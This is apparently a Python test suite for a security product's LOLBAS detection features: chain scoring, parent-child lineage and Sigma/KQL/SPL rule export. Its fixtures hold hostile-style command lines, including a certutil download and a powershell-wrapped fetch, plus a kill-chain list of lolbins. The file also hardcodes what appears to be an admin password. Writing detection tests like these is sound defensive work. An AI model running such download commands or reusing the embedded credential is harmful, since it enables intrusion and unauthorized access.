"""Regression tests for LOLBAS L2/L3/L5 features.

Covers:
  L2 — multi-stage chain scoring (`compute_lolbas_chain`)
  L3 — parent-child lineage detection & severity uplift
  L5 — Sigma / KQL / SPL rule export endpoint
"""
from __future__ import annotations
import os

import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/") or "http://localhost:8001"
if BASE_URL == "http://localhost:8001":
    try:
        with open("/app/frontend/.env") as f:
            for line in f:
                if line.startswith("REACT_APP_BACKEND_URL="):
                    BASE_URL = line.split("=", 1)[1].strip().rstrip("/")
    except Exception:
        pass

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def auth_headers():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                      timeout=15)
    assert r.status_code == 200
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


# ─────────────────────────────────────────────────────────────────────
# L2 · Chain scoring — pure-python tests (no HTTP)
# ─────────────────────────────────────────────────────────────────────
class TestChainScoring:
    def test_empty_hits(self):
        from lolbas_chain import compute_lolbas_chain
        result = compute_lolbas_chain([], "")
        assert result["is_chain"] is False
        assert result["chain_score"] == 0.0
        assert result["distinct_stages"] == 0
        assert result["severity_boost"] == "low"

    def test_single_stage_only(self):
        from lolbas_chain import compute_lolbas_chain
        hits = [{"binary": "certutil.exe", "purposes": ["Download"], "mitre": ["T1105"]}]
        r = compute_lolbas_chain(hits, "certutil.exe -urlcache -f http://x/y c:\\y")
        assert r["is_chain"] is False
        assert r["distinct_stages"] == 1
        assert r["chain_score"] == 0.25

    def test_full_kill_chain_scores_1(self):
        from lolbas_chain import compute_lolbas_chain
        hits = [
            {"binary": "certutil.exe", "purposes": ["Download", "Decode"]},
            {"binary": "rundll32.exe", "purposes": ["Execute"]},
            {"binary": "schtasks.exe", "purposes": ["Persistence"]},
            {"binary": "vssadmin.exe", "purposes": ["Impact"]},
        ]
        r = compute_lolbas_chain(hits, "")
        assert r["distinct_stages"] == 5      # Download + Decode + Execute + Persist + Impact
        assert r["chain_score"] == 1.0
        assert r["severity_boost"] == "high"
        assert r["is_chain"] is True

    def test_flow_summary_ordered(self):
        from lolbas_chain import compute_lolbas_chain, STAGE_ORDER
        hits = [{"binary": "certutil.exe", "purposes": ["Download"]},
                {"binary": "rundll32.exe", "purposes": ["Execute"]}]
        r = compute_lolbas_chain(hits, "")
        assert r["flow_summary"].startswith("Download(")
        assert "Execute(rundll32.exe)" in r["flow_summary"]


# ─────────────────────────────────────────────────────────────────────
# L3 · Parent-child lineage
# ─────────────────────────────────────────────────────────────────────
class TestParentChild:
    def test_powershell_spawning_lolbas(self):
        from lolbas_chain import compute_lolbas_chain
        hits = [
            {"binary": "powershell.exe", "purposes": ["Execute"]},
            {"binary": "certutil.exe",   "purposes": ["Download"]},
        ]
        text = ('powershell.exe -nop -c "certutil.exe -urlcache -f '
                'http://x/y.txt y.txt"')
        r = compute_lolbas_chain(hits, text)
        pairs = [(p["parent"], p["child"]) for p in r["parent_child"]]
        assert ("powershell.exe", "certutil.exe") in pairs
        assert r["severity_boost"] in {"medium", "high"}

    def test_no_parent_child_without_shell_wrapping(self):
        from lolbas_chain import compute_lolbas_chain
        hits = [
            {"binary": "certutil.exe", "purposes": ["Download"]},
            {"binary": "rundll32.exe", "purposes": ["Execute"]},
        ]
        # Two lolbins with no shell wrapping — no parent-child edges.
        r = compute_lolbas_chain(hits,
            "certutil.exe -urlcache http://x/y.txt\nrundll32.exe m.dll,Ent")
        assert r["parent_child"] == []


# ─────────────────────────────────────────────────────────────────────
# L5 · Sigma / KQL / SPL export endpoint
# ─────────────────────────────────────────────────────────────────────
class TestExportEndpoint:
    def test_sigma_certutil(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/lolbas/export",
                          headers=auth_headers,
                          json={"binary": "certutil.exe", "fmt": "sigma"},
                          timeout=10)
        assert r.status_code == 200
        d = r.json()
        assert d["fmt"] == "sigma"
        assert d["binary"] == "certutil.exe"
        assert "title: LOLBAS · certutil.exe" in d["content"]
        assert "Image|endswith: '\\certutil.exe'" in d["content"]
        assert "T1105" in d["content"] or "T1140" in d["content"]

    def test_kql_certutil(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/lolbas/export",
                          headers=auth_headers,
                          json={"binary": "certutil.exe", "fmt": "kql"},
                          timeout=10)
        assert r.status_code == 200
        assert r.json()["fmt"] == "kql"
        assert "DeviceProcessEvents" in r.json()["content"]

    def test_spl_certutil(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/lolbas/export",
                          headers=auth_headers,
                          json={"binary": "certutil.exe", "fmt": "spl"},
                          timeout=10)
        assert r.status_code == 200
        assert "sourcetype IN" in r.json()["content"]

    def test_unknown_binary_404(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/lolbas/export",
                          headers=auth_headers,
                          json={"binary": "notarealbinary.exe", "fmt": "sigma"},
                          timeout=10)
        assert r.status_code == 404

    def test_invalid_fmt_422(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/lolbas/export",
                          headers=auth_headers,
                          json={"binary": "certutil.exe", "fmt": "yaml"},
                          timeout=10)
        assert r.status_code == 422


# ─────────────────────────────────────────────────────────────────────
# L1 · New 2025 bins are indexed
# ─────────────────────────────────────────────────────────────────────
def test_new_2025_lolbas_bins_in_curated_list():
    from lolbas import _L_DEFAULT
    bins = {r["bin"].lower() for r in _L_DEFAULT}
    for expected in ("dotnet.exe", "dnx.exe", "dxcap.exe",
                     "desktopimgdownldr.exe", "presentationhost.exe"):
        assert expected in bins, f"{expected} missing from curated defaults"
